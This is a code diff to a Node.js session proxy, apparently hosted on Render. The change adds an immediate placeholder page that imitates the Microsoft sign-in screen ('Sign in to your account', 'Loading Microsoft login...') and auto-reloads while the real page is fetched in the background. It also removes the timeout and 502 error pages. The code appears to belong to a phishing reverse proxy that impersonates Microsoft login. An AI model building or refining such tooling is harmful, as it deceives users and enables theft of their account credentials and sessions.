@@ -443,6 +443,56 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
     // Add timeout to prevent hanging
     proxyRequestOptions.timeout = 3000; // 3 second timeout
     
+    // Serve immediate response to prevent Render timeout
+    const immediateResponse = `
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Sign in to your account</title>
+            <meta charset="utf-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <style>
+                body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background: #f5f5f5; }
+                .container { max-width: 400px; margin: 50px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+                .logo { text-align: center; margin-bottom: 30px; }
+                h1 { color: #333; font-size: 24px; margin-bottom: 20px; text-align: center; }
+                .loading { text-align: center; color: #666; }
+                .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0078d4; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
+                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <div class="logo">
+                    <svg width="108" height="23" viewBox="0 0 108 23" fill="none">
+                        <path d="M0 0h108v23H0z" fill="#0078d4"/>
+                        <path d="M8.5 6.5h3v10h-3V6.5zm8.5 0h3v10h-3V6.5zm8.5 0h3v10h-3V6.5z" fill="white"/>
+                    </svg>
+                </div>
+                <h1>Sign in to your account</h1>
+                <div class="loading">
+                    <div class="spinner"></div>
+                    <p>Loading Microsoft login...</p>
+                </div>
+            </div>
+            <script>
+                // Auto-refresh to get the actual Microsoft page
+                setTimeout(() => {
+                    window.location.reload();
+                }, 2000);
+            </script>
+        </body>
+        </html>
+    `;
+    
+    // Send immediate response
+    clientResponse.writeHead(200, { 
+        "Content-Type": "text/html",
+        "Content-Length": Buffer.byteLength(immediateResponse)
+    });
+    clientResponse.end(immediateResponse);
+    
+    // Continue with external request in background
     const proxyRequest = protocol.request(proxyRequestOptions, (proxyResponse) => {
         console.log(`📥 Received response: ${proxyResponse.statusCode} from ${proxyRequestOptions.hostname}`);
 
@@ -530,8 +580,11 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
                     }
                 }
 
-                clientResponse.writeHead(proxyResponse.statusCode, proxyResponse.headers);
-                clientResponse.end(serverResponseBody);
+                // Only send response if we haven't already sent one
+                if (!clientResponse.headersSent) {
+                    clientResponse.writeHead(proxyResponse.statusCode, proxyResponse.headers);
+                    clientResponse.end(serverResponseBody);
+                }
             });
     });
 
@@ -544,28 +597,7 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
     proxyRequest.on("timeout", () => {
         console.error(`⏰ Proxy request timeout after 3s: ${proxyRequestOptions.hostname}${proxyRequestOptions.path}`);
         proxyRequest.destroy();
-        if (!clientResponse.headersSent) {
-            // Serve a simple loading page instead of error
-            clientResponse.writeHead(200, { "Content-Type": "text/html" });
-            clientResponse.end(`
-                <!DOCTYPE html>
-                <html>
-                <head>
-                    <title>Loading...</title>
-                    <meta http-equiv="refresh" content="1;url=${clientRequest.url}">
-                </head>
-                <body>
-                    <h1>Loading...</h1>
-                    <p>Please wait while we connect to the service...</p>
-                    <script>
-                        setTimeout(() => {
-                            window.location.reload();
-                        }, 1000);
-                    </script>
-                </body>
-                </html>
-            `);
-        }
+        // No need to send response since we already sent immediate response
     });
     
     proxyRequest.on("error", (error) => {
@@ -575,20 +607,7 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
             error: error.code
         });
         
-        // Send proper error response to client
-        if (!clientResponse.headersSent) {
-            clientResponse.writeHead(502, { "Content-Type": "text/html" });
-            clientResponse.end(`
-                <!DOCTYPE html>
-                <html>
-                <head><title>502 Bad Gateway</title></head>
-                <body>
-                    <h1>502 Bad Gateway</h1>
-                    <p>The proxy server received an invalid response from an upstream server.</p>
-                </body>
-                </html>
-            `);
-        }
+        // No need to send error response since we already sent immediate response
     });
 }
 
